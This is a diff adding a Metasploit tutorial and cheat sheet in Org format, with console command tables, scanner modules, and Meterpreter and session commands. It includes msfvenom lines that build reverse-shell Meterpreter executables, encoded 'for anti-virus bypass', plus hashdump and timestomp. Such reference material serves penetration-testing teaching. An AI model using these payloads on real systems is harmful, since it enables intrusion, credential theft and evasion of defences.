@@ -6,6 +6,26 @@
 * TABLE OF CONTENT :toc:
 - [[#introduction][Introduction]]
 - [[#metasploit-modules][Metasploit modules]]
+- [[#man-page][Man page]]
+  - [[#core-commands][Core Commands]]
+  - [[#module-commands][Module Commands]]
+  - [[#job-commands][Job Commands]]
+  - [[#resource-script-commands][Resource Script Commands]]
+  - [[#database-backend-commands][Database Backend Commands]]
+  - [[#credentials-backend-commands][Credentials Backend Commands]]
+  - [[#developer-commands][Developer Commands]]
+- [[#basic-commands][Basic Commands]]
+  - [[#open-metasploit-console][Open metasploit console]]
+  - [[#help-command][Help Command]]
+  - [[#msfupdate-command][msfupdate Command]]
+  - [[#search-command][Search Command]]
+  - [[#info-command][info Command]]
+- [[#cheat-sheet][Cheat Sheet]]
+  - [[#usefull-auxiliary-modules][Usefull Auxiliary Modules]]
+  - [[#msfvenom][msfvenom]]
+  - [[#metasploit-meterpreter][Metasploit Meterpreter]]
+  - [[#managing-sessions][Managing Sessions]]
+  - [[#multiple-sessions][Multiple Sessions]]
 
 * Introduction
 Metasploit is primarily used from the command line interface(CLI), which provides extensive functionality for exploting vulnerabilities, conducting penetration tests, and managing security assessments. However, Metasploit also includes a web-based graphical user interface(GUI) called Armitage, which provides a more user-friendly interface for performing similar tasks.
@@ -23,6 +43,356 @@ Metasploit provides you with many module some are
 8. *Scanner* : Scanner modules are used to identify vulnerabilities and misconfigurations in target systems or networks through scanning techniques such as port scanning, service enumeration, and vulnerability detection.
 9. *Stager* : tager modules provide initial code execution on the target system, typically used as part of multi-stage exploits or payload delivery techniques.
 10. *Post* : Post modules automate post-exploitation tasks, such as gathering information, pivoting to other systems, or cleaning up after an attack.
+
+* Man page
+** Core Commands
+| Command  | Description                                                           |
+|----------+-----------------------------------------------------------------------|
+| ?        | Help menu                                                             |
+| banner   | Display an awesome metasploit banner                                  |
+| cd       | change the current working directory                                  |
+| color    | Toggle color                                                          |
+| connect  | Communicate with a host                                               |
+| debug    | Display information useful for debugging                              |
+| exit     | exit the console                                                      |
+| features | Display the list of not yet released features that can be opted in to |
+| get      | Gets the value of a context-specific variable                         |
+| getg     | Gets the value of a global variable                                   |
+| grep     | Grep the output of another command                                    |
+| help     | help menu                                                             |
+| history  | Show command history                                                  |
+| load     | Load a framework plugin                                               |
+| quit     | exit the console                                                      |
+| repeat   | Repeat a list of commands                                             |
+| route    | route traffic trhough a session                                       |
+| save     | Saves the active datastores                                           |
+| sessions | Dump session listings and display information about sessions          |
+| set      | Sets a context-specific variable to a value                           |
+| setg     | Sets a global variable to a value                                     |
+| sleep    | Do noting for the specific number of seconds.                         |
+| spool    | Write console output into a file as well the screen                   |
+| threads  | View and manipulate background threads                                |
+| tips     | show a list of useful productivity tips                               |
+| unload   | Unload a framework plugin                                             |
+| unset    | Unset one or more context-specific variables                          |
+| unsetg   | Unset one or more global variables                                    |
+| version  | Show the framework and console library version number                 |
+
+** Module Commands
+
+| Command    | Description                                                     |
+|------------+-----------------------------------------------------------------|
+| advanced   | Display advanced options for one or more modules                |
+| back       | Move back from the current context                              |
+| clearm     | Clear the module stack                                          |
+| favorite   | Add module(s) to the list of favorite modules                   |
+| favorites  | Print the list of favorite modules (alias for 'show favorites') |
+| info       | Display information about one or more modules                   |
+| listm      | List the module stack                                           |
+| loadpath   | Searches for and loads modules from a path                      |
+| options    | Displays global options or for one or more modules              |
+| popm       | Pops the latest module off the stack and makes it active        |
+| previous   | Sets the previously loaded module as the current module         |
+| pushm      | Pushes the active or list of modules onto the module stack      |
+| reload_all | Reloads all modules from all defined module paths               |
+| search     | Searches module names and descriptions                          |
+| show       | Displays modules of a given type, or all modules                |
+| use        | Interact with a module by name or search term/index             |
+
+** Job Commands
+
+| Command    | Description                    |
+|------------+--------------------------------|
+| handler    | Start a payload handler as job |
+| jobs       | Displays and manages jobs      |
+| kill       | Kill a job                     |
+| rename_job | Rename a job                   |
+
+** Resource Script Commands
+
+| Command  | Description                                 |
+|----------+---------------------------------------------|
+| makerc   | Save commands entered since start to a file |
+| resource | Run the commands stored in a file           |
+
+
+** Database Backend Commands
+
+| Command      | Description                                                                     |
+|--------------+---------------------------------------------------------------------------------|
+| analyze      | Analyze database information about a specific address or address range          |
+| db_connect   | Connect to an existing data service                                             |
+| db_disconnec | Disconnect from the current data service                                        |
+| db_export    | Export a file containing the contents of the database                           |
+| db_import    | Import a scan result file (filetype will be auto-detected)                      |
+| db_nmap      | Executes nmap and records the output automatically                              |
+| db_rebuild_c | Rebuilds the database-stored module cache (deprecated)                          |
+| db_remove    | Remove the saved data service entry                                             |
+| db_save      | Save the current data service connection as the default to reconnect on startup |
+| db_stats     | Show statistics for the database                                                |
+| db_status    | Show the current data service status                                            |
+| hosts        | List all hosts in the database                                                  |
+| klist        | List Kerberos tickets in the database                                           |
+| loot         | List all loot in the database                                                   |
+| notes        | List all notes in the database                                                  |
+| services     | List all services in the database                                               |
+| vulns        | List all vulnerabilities in the database                                        |
+| workspace    | Switch between database workspaces                                              |
+
+
+** Credentials Backend Commands
+
+| Command | Description                          |
+|---------+--------------------------------------|
+| creds   | List all credentials in the database |
+
+
+** Developer Commands
+
+| Command    | Description                                                 |
+|------------+-------------------------------------------------------------|
+| edit       | Edit the current module or a file with the preferred editor |
+| irb        | Open an interactive Ruby shell in the current context       |
+| log        | Display framework.log paged to the end if possible          |
+| pry        | Open the Pry debugger on the current module or Framework    |
+| reload_lib | Reload Ruby library files from specified paths              |
+| time       | Time how long it takes to run a particular command          |
+
+
+* Basic Commands
+** Open metasploit console
+#+begin_example
+$ sudo msfconsole
+#+end_example
+
+** Help Command
+#+begin_example
+msf> help
+#+end_example
+
+** msfupdate Command
+#+begin_example
+msf> msfupdate
+#+end_example
+
+** Search Command
++ *Search* is a powerful command in Metasploit that you can use to find what you want to locate.
++ For example, if you want to find exploits related to Microsoft, then the command will be 
+#+begin_example
+msf > search name:Microsoft type:exploit
+#+end_example
+    - *name* is the name of the object that you are looking for.
+    - *type* is the kind of script you are searching.
+
+** info Command      
++ The *info* command provide information regarding a module or platform, such as where it is used, who is the author, vulnerability reference, and its payload restiction
+#+begin_example
+msf> info auxiliary/admin/http/iis_auth_bypass
+#+end_example
+
+* Cheat Sheet
++ *Search for module:*
+#+begin_example
+msf> search [regex]
+#+end_example
+
++ *Specify and exploit to use:*
+#+begin_example
+msf> use exploit/[ExploitPath]
+#+end_example
+
++ *Specify a Payload to use:*
+#+begin_example
+msf> set PAYLOAD [PayloadPath]
+#+end_example
+
++ *Show options for the current modules:*
+#+begin_example
+msf> show optoins
+#+end_example
+
++ *Set options:*
+#+begin_example
+msf> set [Option] [Value]
+#+end_example
+
++ *Start exploit:*
+#+begin_example
+msf> exploit
+#+end_example
+
+** Usefull Auxiliary Modules
++ *Port Scanner:*
+#+begin_example
+msf > use auxiliary/scanner/portscan/tcp
+msf > set RHOSTS 10.10.10.0/24
+msf > run
+#+end_example
+
++ *DNS Enumeration:*
+#+begin_example
+msf > use auxiliary/gather/dns_enum
+msf > set DOMAIN target.tgt
+msf > run
+#+end_example
+
++ *FTP Server:*
+#+begin_example
+msf > use auxiliary/server/ftp
+msf > set FTPROOT /tmp/ftproot
+msf > run
+#+end_example
+
++ *Proxy Server:*
+#+begin_example
+msf > use auxiliary/server/socks4
+msf > run 
+#+end_example
+
+** msfvenom
+The msfvenom tool can be used to generate Metasploit payloads(such as Meterpreter) as standalone files and optionally encode them. This tool replaces the former msfpayload and msfencode tools. Run with "-l payload" to get a list of payloads.
+#+begin_example
+$ msfvenom –p [PayloadPath]
+–f [FormatType]
+LHOST=[LocalHost (if reverse conn.)]
+LPORT=[LocalPort]
+#+end_example
+
+*Example:*
+Reverse Meterpreter payload as an executable and redirected into a file:
+#+begin_example
+$ msfvenom -p windows/meterpreter/
+reverse_tcp -f exe LHOST=10.1.1.1
+LPORT=4444 > met.exe
+#+end_example
+
+Format Options(specified with -f) --help-formats -List available output formats
+
+exe – Executable pl – Perl rb – Ruby raw – Raw shellcode c – C code
+
+Encoding Payloads with msfvenom
+
+The msfvenom tool can be used to apply a level of encoding for anti-virus bypass. Run with '-l encoders' to get a list of encoders.
+#+begin_example
+$ msfvenom -p [Payload] -e [Encoder] -f
+[FormatType] -i [EncodeInterations]
+LHOST=[LocalHost (if reverse conn.)]
+LPORT=[LocalPort]
+#+end_example
+
+*Example*
+Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:
+#+begin_example
+$ msfvenom -p windows/meterpreter/
+reverse_tcp -i 5 -e x86/shikata_ga_nai -f
+exe LHOST=10.1.1.1 LPORT=4444 > mal.exe
+#+end_example
+
+** Metasploit Meterpreter
+*** Basic Commands
++ ? / help: Display a summary of commands exit / quit: Exit the Meterpreter session
++ *sysinfo* : Show the system name and OS type
++ *shutdown / reboot*: Self-explanatory
+
+**** File System Commands:
++ *cd* : Change directory
++ *lcd* : Change directory on local (attacker's) machine
++ *pwd / getwd* : Display current working directory
++ *ls* : Show the contents of the directory
++ *cat* : Display the contents of a file on screen
++ *download / upload* : Move files to/from the target machine
++ *mkdir / rmdir* : Make / remove directory
++ *edit* : Open a file in the default editor (typically vi)
+
+**** Process Commands:
+
++ *getpid* : Display the process ID that Meterpreter is running inside.
++ *getuid* : Display the user ID that Meterpreter is running with.
++ *ps* : Display process list.
++ *kill* : Terminate a process given its process ID.
++ *execute* : Run a given program with the privileges of the process the Meterpreter is loaded in.
++ *migrate* : Jump to a given destination process ID
+    - Target process must have same or lesser privileges
+    - Target process may be a more stable process
+    - When inside a process, can access any files that process has a lock on.
+
+*** Network Commands
++ *ipconfig* : Show network interface information
++ *portfwd* : Forward packets through TCP session
++ *route* : Manage/view the system's routing table
+
+*** Misc Commands
++ *idletime* : Display the duration that the GUI of thetarget machine has been idle.
++ *uictl [enable/disable] [keyboard/mouse]* : Enable/disable either the mouse or keyboard of the target machine.
++ *screenshot* : Save as an image a screenshot of the target machine.
+
+*** Additional Modules
++ use [module]: Load the specified module
++ Example:
+    - use priv: Load the priv module
+    - hashdump: Dump the hashes from the box
+    - timestomp:Alter NTFS file timestamps
+
+** Managing Sessions
+*** Multiple Exploitation
++ Run the exploit expecting a single session that is immediately backgrounded:
+#+begin_example
+msf > exploit -z
+#+end_example
+
++ Run the exploit in the background expecting one or more sessions that are immediately backgrounded:
+#+begin_example
+msf > exploit -j
+#+end_example
+
+*** List all current jobs(usually exploit listeners):
+#+begin_example
+msf > jobs -l
+#+end_example
+
+*** Kill a job:
+#+begin_example
+msf > jobs -k [jobID]
+#+end_example
+
+** Multiple Sessions
++ *List all backgrounded sessions:*
+#+begin_example
+msf > sessions -l
+#+end_example
+
++ *Interact with a backgrounded session:*
+#+begin_example
+msf > session -i [SessionID]
+#+end_example
+
++ *Background the current interactive session:*
+#+begin_example
+meterpreter > <Ctrl+Z>
+or
+meterpreter > background
+#+end_example
+
++ *Routing Through sessions:*
+  All modules(exploits/post/aux) against the target subnet mask will be privoted through this session.
+#+begin_example
+msf > route add [Subnet to Route To]
+[Subnet Netmask] [SessionID]
+#+end_example
+
+
+
+
+
+
+
+
+
+
+
+https://github.com/ShubhamJagtap2000/Metasploit-Tutorial.git
+
+
 
 
 
